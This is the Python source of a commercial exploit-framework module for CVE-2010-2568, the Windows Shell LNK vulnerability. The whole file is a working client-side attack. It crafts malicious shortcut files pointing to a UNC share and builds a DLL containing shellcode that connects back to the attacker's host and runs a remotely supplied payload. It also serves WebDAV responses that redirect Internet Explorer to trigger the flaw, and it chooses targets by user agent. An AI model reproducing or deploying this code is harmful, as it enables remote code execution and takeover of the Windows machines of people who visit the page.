#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import *
from httpclientside import *
from libs.spkproxy import header, body
from urlparse import urlparse

from MOSDEF.pelib import PElib
import canvasengine

NAME="windows_shell_lnk"
DESCRIPTION="Windows Shell Link Vulnerability"

DOCUMENTATION={}
DOCUMENTATION["VENDOR"]="Microsoft"
DOCUMENTATION["Date public"]="07/20/2010"
DOCUMENTATION["References"]=["http://www.microsoft.com/technet/security/advisory/2286198.mspx"]
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["VersionsAffected"]="Windows XP, Windows 2003, Windows Vista, Windows 2008, Windows 7"
DOCUMENTATION["CVE Name"] = "CVE-2010-2568"
DOCUMENTATION["Notes"] = """
"""

VERSION="1.0"

PROPERTY={}
PROPERTY["TYPE"]="Exploit"
PROPERTY["SITE"]="Clientside"
PROPERTY["ARCH"]=[["Windows"]]
PROPERTY["VERSION"]=["XP","2003","7"]
PROPERTY["MSADV"]="MS10-0XX"
PROPERTY["DELIVERY"]="HTTP"
PROPERTY["Notes"] = """
"""

NOTES="""
Use port 80 as the server port.

Tested on:
  - Windows XP SP3
  - Windows 2003
  - Windows 7 32bit
"""

CHANGELOG="""
"""

targets={
    0:["N/A", None, 0],
    1:["Windows", "en-us", 0],
    #  Name       language       Get Stack           kernel32!VirtualProtect
}

from random import randint
from random import choice
from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
from struct import pack

class theexploit(httpclientside):
    """
    This exploit does work for windows 64 since the vector of attack is Internet Explorer
    and provided that we do not open an external explorer.exe process, the 32 bit dll will
    work on 64 bit hosts.
    """
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        # Flag to use the 64bit version
        self.win64 = False

        self.version = 0
        self.name = NAME

        self.is_running = False

        # Pick a random share name
        self.share_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6))

        # We have two links and two dll's (one 32bit and the other 64bit)
        self.link_name32 = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".lnk"
        self.dll_name32  = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".dll"
        
        self.link_name64 = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".lnk"
        self.dll_name64  = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".dll"
        
        # By default we use 32 bit dll (Used because httpserver does not call is_vulnerable)
        self.link_name = self.link_name32
        self.dll_name = self.dll_name32
        
        self.refresh_rate = 30
        return

    def done(self):
        devlog("LNK", "IM DONE!")
        
    def run(self):
        devlog("LNK", "run()")

        self.unc_path = "\\\\" + str(self.callback.ip) + "\\"
        if self.share_name != "":
            self.unc_path += self.share_name + "\\"

        # Create the dll file and place it on the fs
        self.create_dll_file(self.dll_name32, 0)
        #self.create_dll_file(self.dll_name64, 1)

        # Generate the .lnk files pointing to their respective dll's
        self.create_link_file(self.link_name32, self.dll_name32)
        #self.create_link_file(self.link_name64, self.dll_name64)

        self.is_running = True

        return True

    def create_link_file(self, filename, dll_path):
        """
        Generate the contents of the link file.
        Filename will be the name of the link file
        and dll_path will be the absolute path to the
        dll payload. The path can be an UNC name.

        Return: The contents of the file
        """

        # HeaderSize (fixed)
        link_file  = "\x4c\x00\x00\x00"

        # LinkCLSID
        link_file += "\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"

        # LinkFlags = HasLinkTargetIDList | ForceNoLinkInfo
        link_file += "\x81\x00\x00\x00"

        # FileAttributes
        link_file += "\x00\x00\x00\x00"

        # CreationTime, AccessTime, WriteTime
        link_file += "\x00\x00\x00\x00\x00\x00\x00\x00"
        link_file += "\x00\x00\x00\x00\x00\x00\x00\x00"
        link_file += "\x00\x00\x00\x00\x00\x00\x00\x00"

        # FileSize
        link_file += "\x00\x00\x00\x00"

        # IconIndex
        link_file += "\x00\x00\x00\x00"

        # ShowCommand default is SW_SHOWNORMAL
        link_file += "\x01\x00\x00\x00"

        # HotKey
        link_file += "\x00\x00"

        # Reserved bytes (10 bytes)
        link_file += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        # Build the LinkTargetIDList
        # Info is here: http://www.sinfocol.org/2010/07/analisis-vulnerabilidad-cve-2010-2568/
        # Adding ItemID's
        # ItemIDSize (2 bytes long) takes into account the ItemIDSize size (2 bytes)
        # Data (variable length)
        idlist_array = ""

        # Item1: ?? {20d04fe0-3aea-1069-a2d8-08002b30309d} is My Computer Object
        tmp = "\x1f\x00"
        tmp += "\xe0\x4f\xd0\x20\xea\x3a\x69\x10\xa2\xd8\x08\x00\x2b\x30\x30\x9d"
        idlist_array += pack("<h", len(tmp) + 2)
        idlist_array += tmp

        # Item2: ?? {21ec2020-3aea-1069-a2dd-08002b30309d} is the Control Panel Object
        tmp = "\x2e\x1e"
        tmp += "\x20\x20\xec\x21\xea\x3a\x69\x10\xa2\xdd\x08\x00\x2b\x30\x30\x9d"
        idlist_array += pack("<h", len(tmp) + 2)
        idlist_array += tmp

        # Item3: Path (Unicode and null terminated)
        absolute = self.unc_path + dll_path
        tmp = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        tmp += absolute.encode("utf-16-le")
        tmp += "\x00\x00" # NULL Terminate
        idlist_array += pack("<h", len(tmp) + 2)
        idlist_array += tmp

        devlog("LNK", "absolute path for %s is %s" %(filename, absolute))

        # IDListSize (size in bytes of the IDList plus 2 bytes of the size field)
        # and the IDlist array contents and the TerminalID (end of the items id)
        idlist_data = pack("<h", len(idlist_array) + 2) + idlist_array + "\x00\x00"

        # Append the LinkTargetIDList
        link_file += idlist_data

        fd = open(filename, "wb")
        fd.write(link_file)
        fd.close()

    def create_dll_file(self, dll_name, win64=0):
        """
        Create the dll with our payload as an exported function

          dll_name: the name of the dll that we want to create.
          win64: set it to 1 if you want to generate a win64 payload

        Return: The dll contents
        """
        # We can create win64 dll's too
        pelib = PElib(win64)

        # Create the dll in memory
        buffer = pelib.createPEFileBuf({"pwn_payload" : self.createShellcode(win64)}, gui=False)

        # Write the dll to the fs
        fd = open(dll_name, "wb")
        fd.write(buffer)
        fd.close()

        self.dll_file = buffer

        return buffer

    def createShellcode(self, win64=0):
        """
        Used to set the shellcode that we are going to use

        Return: The shellcode

        TODO: Add support for HTTP MOSDEF
        """
        if win64 == 1: return self.createShellcode64()

        return self.createShellcode32()

    def createShellcode64(self):
        """
        Not used. Just for testing purposes.
        """
        from shellcode.standalone.windows.payloads64 import payloads
        
        host = self.callback.ip
        port = self.callback.port
        
        p = payloads()
        
        # self.shellcode = "\x90" + p.assemble(p.callback(host, port)) + "\x90"
        self.shellcode = "\x90" + "\xcc" + "\x90"
        
        return self.shellcode

    def createShellcode32(self):
        """
        Used to set the shellcode that we are going to user

        Return: The shellcode

        TODO: Add support for HTTP MOSDEF
        """

        devlog("LNK", "createShellcode")

        class ShellcodeHelper(shellcodeGenerator.win32):
            """
            Derives from our previous one, but has our cleanup code in it.
            """
            def __init__(self):
                shellcodeGenerator.win32.__init__(self)
                self.handlers["lnk_cleanup"]=self.lnk_cleanup
                self.vProtectSelf = False

            def lnk_cleanup(self, args):
                self.code += """movl $0xff0, %ebx
movl %fs:4(%ebx), %esp
popad
xorl %eax, %eax
ret
"""
        host = self.callback.ip
        port = self.callback.port

        self.callback.argsDict["fromcreatethread"] = 0

        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)

        sc = shellcodeGenerator.win32()

        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("loadFDasreg", {"reg" : "esi"})
        sc.addAttr("RecvExecDepSafe", None) #MOSDEF
        sc.addAttr("ExitProcess", None)
        proxy_payload = sc.get()

        # Here we use a shellcode with a custom exit stub
        sc = ShellcodeHelper()
        sc.addAttr("findeipnoesp", {"subespval": 0x1000})
        sc.addAttr("InjectToSelf", { "injectme" : proxy_payload, "DONTEXIT" : True})
        sc.addAttr("lnk_cleanup", None)

        mutex = mosdef.assemble("""
pushad
movl $0xff0, %ebx
movl %fs:0(%ebx), %eax
test %eax, %eax
jz lnk_payload

lnk_exit:
popad
xorl %eax, %eax
ret

lnk_payload:
// if reason == 1 then do payload
// we use 40 cause we have 32 bytes from the pushad and 8(%esp) is the second arg
movl 40(%esp), %eax
cmpl $1, %eax
jnz lnk_exit

// Set the mutex to 1
movl $1, %fs:0(%ebx)
movl %esp, %fs:4(%ebx)
""", "x86")
        int = mosdef.assemble("""int3""", "x86")
        self.shellcode = mutex + sc.get()

        if len(self.shellcode) % 4:
            self.shellcode += "\x90"*(4-(len(self.shellcode) % 4))

        devlog("LNK", "Using TCP callback shellcode (%s:%d)"%(host,port))
        devlog("LNK", "Length of shellcode: %s"%len(self.shellcode))
        
        return self.shellcode


    def makesploit(self, clientheader, clientbody):
        """
        """
        devlog("LNK", "makesploit()")

        if self.is_running == False:
            self.run()

        self.log("makesploit()")

        self.log(clientheader.verb)

        if clientheader.verb == "OPTIONS":
            h, b = self.do_options(clientheader, clientbody)
        elif clientheader.verb == "PROPFIND":
            h, b = self.do_propfind(clientheader, clientbody)
        elif clientheader.verb in ["GET","POST"]:
            # this is our first request!
            h, b = self.do_get(clientheader, clientbody)
            self.registerWebDavDirectory(self.share_name)
        else:
            self.log("Invalid request method (%s)" %clientheader.verb)
            h = header("SERVER")
            b = body()
            h.status = "404"
            h.msg = "Not Found"
            h.addHeader("Content-Type", "text/html")
            b.setBody("")

        return h, b

    def do_get(self, clientheader, clientbody):
        """
        Process a GET request from the client.

        In this exploit, it will first redirect to the UNC path so IE
        will start an instance of explorer.exe and trigger the vulnerability.
        """

        devlog("LNK", "Serving GET request (%s)" %clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".dll"):
            devlog("LNK", "Serving DLL Payload (%s)" % clientheader.URL)

            if clientheader.URL.endswith(self.dll_name32):
                content = open(self.dll_name32).read()
                devlog("LNK", "DLL32 File (%s)" % self.dll_name32)
            else:
                content = open(self.dll_name64).read()
                devlog("LNK", "DLL64 File (%s)" % self.dll_name64)

            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        elif clientheader.URL.endswith(".lnk"):
            devlog("LNK", "Serving LNK File (%s)" % clientheader.URL)

            if clientheader.URL.endswith(self.link_name32):
                content = open(self.link_name32).read()
                devlog("LNK", "LNK32 File (%s)" % self.link_name32)
            else:
                content = open(self.link_name64).read()
                devlog("LNK", "LNK64 File (%s)" % self.link_name64)

            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        else:
            devlog("LNK", "Redirecting to UNC (%s)" % self.unc_path)

            h.addHeader("Content-Type","text/html")

            # Redirect to \\<IP>\<SHARE_NAME>\
            html_body = '<html><head><meta http-equiv="refresh" content="0;URL=%s"></head><body></body></html>' %self.unc_path
            b.setBody(html_body)

        return h, b

    def do_options(self, clientheader, clientbody):
        devlog("LNK", "Serving OPTIONS request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        h.addHeader("Content-Type", "text/xml")
        h.addHeader("DAV", "1, 2")
        h.addHeader("Public", "OPTIONS, GET, PROPFIND")
        h.addHeader("Allow", "OPTIONS, GET, PROPFIND")
        
        # h.status = "207"
        # h.msg = "Multi-Status"
        h.status = "200"
        h.msg = "OK"

        b.setBody("")

        devlog("LNK", h.printme())

        return h, b

    def do_propfind(self, clientheader, clientbody):
        """
        All the needed information is here:
        http://www.webdav.org/specs/rfc2518.html
        
        The PROPFIND method retrieves properties defined on the resource identified by the Request-URI
        """

        devlog("LNK", "Serving PROPFIND request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".dll"):
            devlog("LNK", "Sending multi-status for %s" % clientheader.URL)
            requested_dll = urlparse(clientheader.URL).path.split("/")[-1]
            devlog("LNK", "Requested dll is %s" % requested_dll)
            
            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" %(clientheader.URL, requested_dll, randint(0x1F400,0x11F400), randint(0x0, 0x100000000))

            # The default 207 (Multi-Status) response body is a text/xml or application/xml
            # HTTP entity that contains a single XML element called multistatus, which contains
            # a set of XML elements called response which contain 200, 300, 400, and 500
            # series status codes generated during the method invocation.
            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type", "text/xml")
            b.setBody(content_body)

            return h, b

        if clientheader.URL.endswith(".lnk"):
            devlog("LNK", "Sending multi-status for %s" %clientheader.URL)
            requested_lnk = urlparse(clientheader.URL).path.split("/")[-1]
            devlog("LNK", "Requested link is %s" % requested_lnk)
            
            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" %(clientheader.URL, requested_lnk, randint(0x80, 0x180), randint(0x0, 0x100000000))

            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type","text/xml")
            b.setBody(content_body)

            return h, b

        if not clientheader.URL.endswith("/"):
            if clientheader.URL.count(".") != 0:
                devlog("LNK", "Sending 404 for %s" % clientheader.URL)

                h.status = "404"
                h.msg = "Not Found"
                h.addHeader("Content-Type","text/html")
                b.setBody("")

                return h, b

        devlog("LNK", "Trying to server content list %s" %(clientheader.URL))

        content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
""" % (clientheader.URL, randint(0x0, 0x100000000))

        files = """
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s/%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>

""" %(clientheader.URL, self.dll_name, randint(0x1F400,0x11F400), randint(0x0, 0x100000000))

        files += """<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s/%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
""" %(clientheader.URL, self.link_name, randint(0x80,0x180), randint(0x0, 0x100000000))

        if int(clientheader.getHeaderValue("Depth")) > 0:
            devlog("LNK", "Depth > 0")
            content_body += files

        content_body += "</D:multistatus>"

        h.status = "207"
        h.msg = "Multi-Status"
        h.addHeader("Content-Type",'text/xml; charset="utf8"')
        b.setBody(content_body)

        devlog("LNK", content_body)

        return h, b

    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run
        """
        devlog("LNK", "is_vulnerable()")

        server_port = self.getServerPort()
        if server_port != 80:
            self.log("The %s exploit needs to be run with port 80 as the server port! Currently this is: %s." %(self.name, server_port))
            self.log("Otherwise webdav does not work.")
            return 0

        # No easy way to test if the target is vulnerable, the most reasonable thing to do
        # is to check if it is a windows host. Since the bug is 100% reliable, this is ok.
        if "Windows" in info_dict["user_agent"] or "MSIE" in info_dict["user_agent"] or "Microsoft" in info_dict["user_agent"]:
            self.log("Found vulnerable target")
            
            if "WOW64" in info_dict["user_agent"]:
                self.win64 = True
                self.log("Attacking a Windows 64 bit version (WOW64)")
                
                self.dll_name = self.dll_name64
                self.link_name = self.link_name64
            else:
                self.dll_name = self.dll_name32
                self.link_name = self.link_name32
                
                self.log("Attacking a Windows 32 bit version")

            return 1

        devlog("LNK", "User Agent: %s" % info_dict.get("user_agent"))

        return 0
# For running the exploit on the command line
if __name__ == "__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

